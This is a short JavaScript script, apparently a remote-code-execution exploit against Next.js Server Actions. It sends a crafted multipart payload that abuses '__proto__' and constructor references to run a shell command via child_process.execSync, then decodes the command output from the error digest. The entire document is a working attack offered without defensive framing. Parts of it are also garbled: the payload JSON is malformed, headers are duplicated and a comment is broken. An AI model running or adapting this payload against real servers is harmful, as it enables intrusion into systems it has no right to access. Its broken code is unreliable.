(async()=>{
    const cmd ="ls"
    const trageturl = "/adfa"

    console.log("start ")

    const payloadJson = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value" }
    "{\\"then\\":$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('${cmd}').('bas64');throw Object.assign(new Error('x'),{digest:res});","_chunks":"$Q2","_formData":{"get":$1:constructor:constructor:}}}`;


    const boundary = "----WebKitFormBoundaryx8j02oVc6SWP3Sad";
// 2. Build the multipart/form-data body manually
const bodyParts = [
`--${boundary}`,'Content-Disposition: form-data; name="0"','',payloadJson,`--${boundary}`,'Content-Disposition: form-data; name="1"','','"$@"',`--${boundary}`,'Content-Disposition: form-data; name="2"','','[]',`--${boundary}--`,''
].join('\r\n');

try {
// 3. Send the request const res await fetch(targetUrl, {
    const res = await fetch(trageturl, {
        method: 'POST',
        headers: {
            'Next-Action':'x',
            'X-Next-Request-ID':'713f9c1e',
            'X-Nextjs-Html-Request-id':'9bK2mPaRtVwXyZ3S@!sT7U',
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'X-Nextjs-Html-Request-id':'SSTMXm70J_g0Ncx6jpQt9'
        },
        body: bodyParts
    });
    const responseText = await res.text();
    // console.log("Response Text:", responseT  ext);
const digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);
console.log("Digest Match:", digestMatch);

    if (digestMatch && digestMatch[1]) {
        let rawBase64 = digestMatch[1];
        let cleanBase64 = JSON.parse(`"${rawBase64}"`);
        const decodedStr = new TextDecoder().decode(Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0)));
        console.log("Command Output:\n", decodedStr);


    } else {
        console.log("No command output found in the response.");
    }
} catch (error) {
    console.error("Error during fetch:", error);    
}


})()